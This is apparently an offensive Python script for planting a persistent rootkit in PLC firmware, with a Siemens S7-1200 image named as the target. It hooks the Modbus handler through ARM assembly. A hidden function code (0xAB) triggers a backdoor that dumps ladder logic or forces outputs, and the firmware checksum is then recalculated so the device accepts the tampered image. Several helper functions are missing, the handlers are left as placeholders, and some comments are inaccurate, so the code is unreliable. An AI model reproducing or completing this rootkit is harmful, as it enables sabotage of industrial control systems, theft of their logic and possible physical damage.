# plc_firmware_rootkit.py - Inject persistent rootkit into PLC firmware
import struct
import hashlib

class PLCFirmwareRootkit:
    def __init__(self, firmware_image):
        self.firmware = bytearray(open(firmware_image, 'rb').read())
        self.rootkit_code = self.compile_rootkit()

    def find_injection_point(self):
        """
        Locate suitable injection point in firmware
        - Look for NOP sleds or padding
        - Find unused code regions
        - Hook initialization routines
        """
        # Search for NOP sled (0x00 bytes)
        for i in range(len(self.firmware) - 1024):
            if self.firmware[i:i+1024] == bytes(1024):
                print(f"[+] Found NOP sled at offset: 0x{i:x}")
                return i

        # Alternative: Extend firmware image (append rootkit)
        return len(self.firmware)

    def compile_rootkit(self):
        """
        Rootkit features:
        - Hook Modbus request handler
        - Hidden function code (0xAB) triggers backdoor
        - Exfiltrate ladder logic on special request
        - Modify process variables on command
        """
        # Assembly code for ARM Cortex-M (common in PLCs)
        rootkit_asm = """
        ; Modbus request handler hook
        PUSH {R4-R7, LR}

        ; Check if function code is 0xAB (magic backdoor trigger)
        LDR R0, [R1]        ; Load Modbus PDU
        LDRB R2, [R0, #0]   ; Get function code
        CMP R2, #0xAB
        BEQ backdoor_handler

        ; Normal processing
        BL original_modbus_handler
        POP {R4-R7, PC}

        backdoor_handler:
        ; Execute hidden command
        LDRB R3, [R0, #1]   ; Get command byte
        CMP R3, #0x01       ; Command: Read ladder logic
        BEQ dump_ladder_logic
        CMP R3, #0x02       ; Command: Modify output
        BEQ modify_output

        dump_ladder_logic:
        ; Copy PLC program to response buffer
        ; [Implementation details]
        POP {R4-R7, PC}

        modify_output:
        ; Force output state regardless of logic
        ; [Implementation details]
        POP {R4-R7, PC}
        """

        # Assemble to bytecode (simplified - actual implementation needs assembler)
        rootkit_bytecode = self.assemble_arm(rootkit_asm)
        return rootkit_bytecode

    def inject_rootkit(self):
        """
        Inject rootkit into firmware and fix control flow
        """
        injection_offset = self.find_injection_point()

        # Write rootkit code
        self.firmware[injection_offset:injection_offset+len(self.rootkit_code)] = self.rootkit_code

        # Hook Modbus handler (redirect to rootkit)
        # Find CALL instruction to original handler
        handler_call_offset = self.find_modbus_handler_call()
        if handler_call_offset:
            # Replace with CALL to rootkit
            self.patch_call_instruction(handler_call_offset, injection_offset)

        # Update firmware checksum
        self.fix_checksum()

        # Write infected firmware
        with open('infected_firmware.bin', 'wb') as f:
            f.write(self.firmware)

        print("[+] Rootkit injected successfully")
        print(f"[+] Inject offset: 0x{injection_offset:x}")

    def fix_checksum(self):
        """
        Recalculate firmware checksum so PLC accepts modified image
        """
        # Checksum usually at end of firmware
        checksum_offset = len(self.firmware) - 4

        # Calculate CRC32 of firmware (excluding checksum field)
        import zlib
        crc = zlib.crc32(self.firmware[:checksum_offset])

        # Write new checksum
        self.firmware[checksum_offset:checksum_offset+4] = struct.pack('<I', crc)

# Usage
rootkit = PLCFirmwareRootkit("siemens_s7_1200_v4.2.bin")
rootkit.inject_rootkit()
